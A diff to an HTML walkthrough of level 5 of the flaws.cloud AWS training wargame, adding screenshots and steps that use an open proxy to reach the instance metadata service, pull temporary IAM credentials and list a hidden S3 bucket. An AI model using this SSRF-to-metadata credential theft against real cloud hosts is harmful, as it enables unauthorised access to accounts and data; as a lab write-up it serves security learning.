@@ -323,10 +323,28 @@ http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</code></pre
       <blockquote>This EC2 has a simple HTTP-only proxy on it. See if you can use it to list the contents of the level 6 bucket, which has a hidden directory in it.</blockquote>
 
       <h3>Recon</h3>
-      <p>The proxy works as <code>/proxy/&lt;hostname&gt;/...</code>. Hitting the EC2 host directly, without <code>/proxy/</code> in front, just asks for credentials: confirming this box is nothing but a proxy. HTTPS through the proxy times out too, likely blocked at the security group.</p>
+      <p>The proxy works as <code>/proxy/&lt;hostname&gt;/...</code>. Tried hitting the EC2 host directly, without <code>/proxy/</code> in front.</p>
+      <figure>
+        <img src="img/level5-direct-denied-1.png" alt="Direct request to the EC2 host without the proxy prefix, asking for credentials">
+      </figure>
+      <p>Tried the same for <code>flaws.cloud</code> without <code>/proxy/</code>.</p>
+      <figure>
+        <img src="img/level5-direct-denied-2.png" alt="Second direct request without the proxy prefix, also asking for credentials">
+      </figure>
+      <p>Same result both times: creds required. Adding <code>/proxy/</code> back in front makes it succeed. Dead end, but it confirmed this box is nothing but a proxy, with nothing else exposed on it directly. HTTPS through the proxy also times out, likely blocked at the security group level.</p>
       <p>The real insight: a proxy fetches <em>anything</em> you point it at, not just public hostnames. Every EC2 instance can reach <code>169.254.169.254</code>, AWS's Instance Metadata Service (IMDS), unauthenticated by design. This is the classic SSRF-to-cloud-metadata pattern.</p>
 
       <h3>Exploitation</h3>
+      <pre><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/</code></pre>
+      <p>Got back the list of supported IMDS API versions.</p>
+      <figure>
+        <img src="img/level5-imds-versions.png" alt="Response listing supported IMDS API versions">
+      </figure>
+      <p>Drilled into <code>latest/meta-data/</code>:</p>
+      <figure>
+        <img src="img/level5-imds-metadata.png" alt="Metadata listing showing an iam folder among other entries">
+      </figure>
+      <p>Drilled into <code>iam/</code> then <code>security-credentials/</code>, found the attached IAM role name, and fetched its credentials:</p>
       <pre><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;</code></pre>
       <pre><code>{
     "Code" : "Success",
@@ -335,6 +353,9 @@ http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</code></pre
     "Token" : "[REDACTED, long session token]",
     "Expiration" : "2026-11-22T16:25:38Z"
 }</code></pre>
+      <figure>
+        <img src="img/level5-iam-credentials.png" alt="Temporary IAM credentials returned by the instance metadata service">
+      </figure>
       <p>Temporary credentials, lifted straight from the instance's own IAM role with no authentication at all. Using them:</p>
       <pre><code>aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile l5key</code></pre>
       <pre><code>                           PRE ddcc78ff/
